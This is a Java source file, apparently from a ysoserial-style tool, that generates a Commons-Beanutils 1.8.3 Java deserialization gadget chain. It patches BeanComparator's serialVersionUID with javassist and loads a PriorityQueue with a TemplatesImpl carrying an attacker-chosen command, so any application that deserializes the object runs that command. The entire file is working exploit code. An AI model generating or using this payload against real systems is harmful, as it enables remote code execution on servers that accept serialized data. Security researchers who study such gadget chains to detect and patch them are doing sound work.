package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import javassist.ClassClassPath;
import javassist.CtClass;
import com.h2tg.ysogate.payloads.ObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Gadgets;
import com.h2tg.ysogate.utils.Reflections;
import com.h2tg.ysogate.utils.SuClassLoader;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

import static com.h2tg.ysogate.config.Config.POOL;
import static com.h2tg.ysogate.payloads.handle.ClassFieldHandler.insertField;
import static com.h2tg.ysogate.utils.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-logging:commons-logging:1.2"})
public class CommonsBeanutils2183NOCC implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		// 修改BeanComparator类的serialVersionUID
		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");

//		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");
		insertField(ctBeanComparator, "serialVersionUID", "private static final long serialVersionUID = -2044202215314119608L;");

		final Comparator comparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		setFieldValue(comparator, "property", "lowestSetBit");
		PriorityQueue<Object> queue = new PriorityQueue(2, comparator);
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));
		setFieldValue(comparator, "property", "outputProperties");
		Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = templates;
		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils2183NOCC.class, args);
	}
}
